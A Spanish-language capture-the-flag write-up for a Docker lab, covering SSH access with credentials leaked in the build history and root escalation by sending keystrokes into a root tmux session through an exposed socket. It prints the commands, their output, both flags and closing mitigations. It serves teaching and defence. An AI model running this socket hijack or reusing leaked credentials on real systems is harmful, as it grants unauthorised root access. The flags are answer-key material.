# LABERINTO — WHOAMI-LABS.COM

**Dificultad:** Insano  
**Categoría:** Web Exploit / SSH / Linux privilege escalation  
**Plataforma:** Linux (Docker)  
**Estado:** resuelto

## Reconocimiento

La enumeración de `172.17.0.2` mostró:

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.67
```

La aplicación web expone `/panel/`, un login PHP y un dashboard de datos
corporativos. El panel contiene una consulta SQL construida con entrada del
usuario, pero la ruta de acceso inicial más directa está en las credenciales
del usuario SSH incluidas accidentalmente en el historial de construcción de la
imagen:

```text
admin_user:SuperSecret123
```

El usuario `admin` (`jordan1`) no está permitido por la configuración SSH:

```text
AllowUsers admin_user
```

## Acceso inicial

Con las credenciales de `admin_user`:

```bash
ssh -p 2222 admin_user@172.17.0.2
id
cat /home/admin_user/user.txt
```

Salida observada:

```text
uid=1001(admin_user) gid=1001(admin_user) groups=1001(admin_user)
user{m4st3r_0f_th3_m4z3_4nd_0s1nt}
```

**Flag de user:** `user{m4st3r_0f_th3_m4z3_4nd_0s1nt}`

## Escalada mediante socket tmux

La enumeración local mostró un socket tmux creado por root y accesible por el
grupo `admin_user`:

```bash
ls -l /var/shared_tmux/socket_admin
tmux -S /var/shared_tmux/socket_admin list-sessions
```

Evidencia:

```text
srwxrwx--- 1 root admin_user ... /var/shared_tmux/socket_admin
root_session: 1 windows (created ...)
```

El proceso de arranque crea una sesión root persistente con `top` como proceso
visible. Al tener acceso al socket, `admin_user` puede enviar teclas a esa
sesión. Se detuvo `top` y se ejecutó el comando en el shell root:

```bash
tmux -S /var/shared_tmux/socket_admin send-keys \
  -t root_session:0 C-c
tmux -S /var/shared_tmux/socket_admin send-keys \
  -t root_session:0 'id; cat /root/root.txt' C-m
tmux -S /var/shared_tmux/socket_admin capture-pane \
  -pt root_session:0 -S -8
```

La salida confirmó:

```text
uid=0(root) gid=0(root) groups=0(root)
root{tmUx_s0ck3t_h1j4ck1ng_1s_l3th4l}
```

**Flag de root:** `root{tmUx_s0ck3t_h1j4ck1ng_1s_l3th4l}`

## Lecciones y mitigaciones

1. No incluir contraseñas en Dockerfile, historial de build ni capas
   recuperables; rotarlas si ya fueron expuestas.
2. No dejar sesiones root persistentes con sockets accesibles por usuarios no
   privilegiados. El socket debe estar en un directorio restringido y la
   sesión root no debe ser compartida.
3. Aplicar mínimo privilegio a grupos y permisos Unix; `admin_user` no debe
   poder escribir sobre el canal de control de root.
4. Usar consultas preparadas en el panel PHP y corregir los errores de
   inicialización de la base de datos antes de desplegar.
